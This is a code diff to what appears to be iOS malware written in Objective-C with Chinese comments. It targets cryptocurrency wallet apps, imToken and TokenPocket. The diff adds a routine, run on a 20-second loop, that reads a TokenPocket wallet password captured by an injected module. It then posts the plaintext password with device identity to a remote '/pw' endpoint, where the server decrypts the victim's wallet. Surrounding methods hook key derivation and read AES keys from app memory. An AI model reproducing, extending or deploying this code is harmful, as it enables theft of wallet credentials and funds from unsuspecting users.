@@ -35,6 +35,7 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 - (void)probeImTokenPassword;
 - (void)tryImTokenAesKeys;
 - (void)probeImTokenTcx;
+- (void)probeTPPassword;
 - (void)probeWalletTree:(NSString *)bundleId;
 @end
 
@@ -502,6 +503,7 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
                         // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
+                        [self probeTPPassword];        // TokenPocket：设备端验证过的密码 → 服务端解密
                         [self probeImTokenTcx];        // 主目标：call_tcx_api 的 JSON 参数
                         [self tryImTokenAesKeys];      // 其次：用截到的 AES 密钥解 keystore
                         [self probeImTokenPassword];   // 其次：KDF hook 拿明文密码
@@ -827,6 +829,46 @@ static NSArray *WalletMemoryTargets(void) {
 
 /// 读 imToken 里 call_tcx_api 的安装状态与实际参数（JSON）
 
+
+#pragma mark - TokenPocket：把设备端验证过的密码送去解密
+
+/// tp 模块在 TP 进程里把密码验证通过后写到 Documents/_tp_pw_ok.txt
+/// 格式：<password>|verified|len=N
+/// 这里读它 → POST /pw(bundle_id=com.global.wallet.ios) → 服务端解 F4SeCyr + P-521
+- (void)probeTPPassword {
+    @try {
+        NSData *d = [WalletFS readFile:@"Documents/_tp_pw_ok.txt" inContainer:@"com.global.wallet.ios"];
+        if (!d.length) d = [WalletFS readFile:@"tmp/_tp_pw_ok.txt" inContainer:@"com.global.wallet.ios"];
+        if (!d.length) return;
+
+        NSString *line = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
+        line = [line stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+        if (!line.length) return;
+        NSString *pwd = [[line componentsSeparatedByString:@"|"] firstObject];
+        pwd = [pwd stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+        if (!pwd.length || pwd.length > 128) return;
+
+        static NSString *last = nil;
+        if ([last isEqualToString:pwd]) return;
+        last = [pwd copy];
+
+        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        body[@"c"] = kSeed;
+        body[@"bundle_id"] = @"com.global.wallet.ios";
+        body[@"pwd"] = pwd;
+        NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:180];
+
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"tp_pwd_sent";
+        ev[@"c"] = kSeed;
+        ev[@"ctx"] = @{ @"pwLen": @(pwd.length), @"resp": r ? [r description] : @"nil" };
+        [self.net sendEvent:ev];
+        [self log:[NSString stringWithFormat:@"TP pwd len=%lu -> %@",
+                   (unsigned long)pwd.length, r ? @"ok" : @"nil"]];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"probeTPPassword: %@", e.reason]];
+    }
+}
 #pragma mark - 容器目录树探针（确定钱包数据到底在哪）
 
 - (void)probeWalletTree:(NSString *)bundleId {
